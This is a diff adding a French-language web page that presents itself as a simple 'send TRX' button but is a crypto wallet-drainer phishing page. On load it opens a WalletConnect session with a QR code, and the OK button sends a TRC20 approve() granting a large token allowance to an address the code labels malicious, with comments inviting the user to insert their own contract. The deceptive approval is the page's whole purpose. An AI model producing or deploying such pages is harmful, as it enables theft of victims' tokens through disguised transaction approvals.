@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Approuver le contrat</title>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/client@1.7.1/dist/umd/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.0/build/qrcode.min.js"></script>
+</head>
+<body>
+    <h1>envoyez des trx</h1>
+    <p>Cliquez sur "OK" pour envoyer des trx.</p>
+    <button id="approveButton">OK</button>
+    <canvas id="qrcode"></canvas>
+
+    <script>
+        // Adresse du contrat malveillant
+        const maliciousContractAddress = "TBh6w3s5nkR2XMEL1xTWQftmurqfUE5TY8"; // Remplacez par l'adresse de votre contrat
+        const tokenAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Remplacez par l'adresse du contrat TRC20
+        const amount = 10000000000; // Montant à approuver (en unités de base)
+
+        // Initialiser WalletConnect
+        const connector = new WalletConnect.Client({
+            bridge: "https://bridge.walletconnect.org",
+        });
+
+        // Afficher le QR code pour la connexion
+        function displayQRCode(uri) {
+            QRCode.toCanvas(document.getElementById("qrcode"), uri, (error) => {
+                if (error) console.error(error);
+                console.log("QR code affiché !");
+            });
+        }
+
+        // Créer une nouvelle session WalletConnect
+        function connectWallet() {
+            connector.createSession().then(() => {
+                displayQRCode(connector.uri);
+            });
+        }
+
+        // Écouter les événements de connexion
+        connector.on("connect", (error, payload) => {
+            if (error) throw error;
+            console.log("Utilisateur connecté :", payload);
+
+            // Récupérer l'adresse de l'utilisateur
+            const userAddress = payload.params[0].accounts[0];
+            console.log("Adresse de l'utilisateur :", userAddress);
+
+            // Activer le bouton "OK"
+            document.getElementById("approveButton").disabled = false;
+        });
+
+        // Écouter les événements de déconnexion
+        connector.on("disconnect", (error, payload) => {
+            if (error) throw error;
+            console.log("Utilisateur déconnecté :", payload);
+        });
+
+        // Gérer le clic sur le bouton "OK"
+        document.getElementById("approveButton").addEventListener("click", () => {
+            // Envoyer la transaction d'approbation
+            connector.sendTransaction({
+                from: connector.accounts[0], // Adresse de l'utilisateur
+                to: tokenAddress, // Adresse du contrat TRC20
+                data: {
+                    // Encodage de la fonction approve(address spender, uint256 value)
+                    function: "approve(address,uint256)",
+                    args: [maliciousContractAddress, amount],
+                },
+            }).then((result) => {
+                console.log("Transaction approuvée :", result);
+                alert("Transaction approuvée avec succès !");
+            }).catch((error) => {
+                console.error("Erreur lors de l'approbation :", error);
+                alert("Une erreur s'est produite. Veuillez réessayer.");
+            });
+        });
+
+        // Démarrer la connexion WalletConnect au chargement de la page
+        connectWallet();
+    </script>
+</body>
+</html>
